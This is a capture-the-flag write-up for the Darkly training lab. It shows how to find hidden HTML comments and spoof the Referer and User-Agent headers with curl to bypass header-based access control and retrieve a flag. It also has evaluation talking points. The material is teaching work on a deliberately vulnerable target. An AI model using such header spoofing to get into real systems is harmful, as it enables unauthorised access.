# 🧠 HTTP Header Manipulation – Referer & User-Agent Spoofing – MEMO

## 📌 Breach Summary
The Darkly application relies on HTTP headers such as `Referer` or `User-Agent` to determine access rights or unlock hidden features. These headers can be easily spoofed by the user, resulting in a **Header Manipulation** vulnerability.

This breach often grants access to a hidden flag or restricted content simply by changing the headers in a request.

---

## ✅ Step-by-Step Exploitation

### 1. 🔍 Identify the Target Page
go to the bottom of the webpage and hit the @borntosec

or

just get there directly with this :

http::/{ip}/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f

There will be an albatross picture. Inspect it (F12). Find the long comment
<!-- You must cumming from : "https://www.nsa.gov/" to go to the next step -->
<!-- Let's use this browser : "ft_bornToSec". It will help you a lot. -->

These comments indicate the server expects a Referer of https://www.nsa.gov/ and a User-Agent of ft_bornToSec

### 2. 🕵️ Spoof Headers Using curl or Burp
use curl to create a new html:
```bash
curl -H "Referer: https://www.nsa.gov/" http://<target-ip>/copyright
```

Or set a fake `User-Agent`:
```bash
curl -s http://10.39.42.166/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" -o ftbts.html
```
open the ftbts.html, the flag is inside

---

## 💬 What to Say During Evaluation

- Explain that HTTP headers can be manipulated client-side.
- Mention that relying on `Referer`, `User-Agent`, or `Host` headers for access control is insecure.
- Demonstrate the spoofed request and resulting content.

---

## 📚 References

- OWASP: Insecure Direct Object References (IDOR)
- Header Spoofing: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypassing-access-controls-using-headers
- Tools used: curl, Postman, Burp Suite (manual requests)

✅ Be ready to show the actual spoofed request and response during evaluation.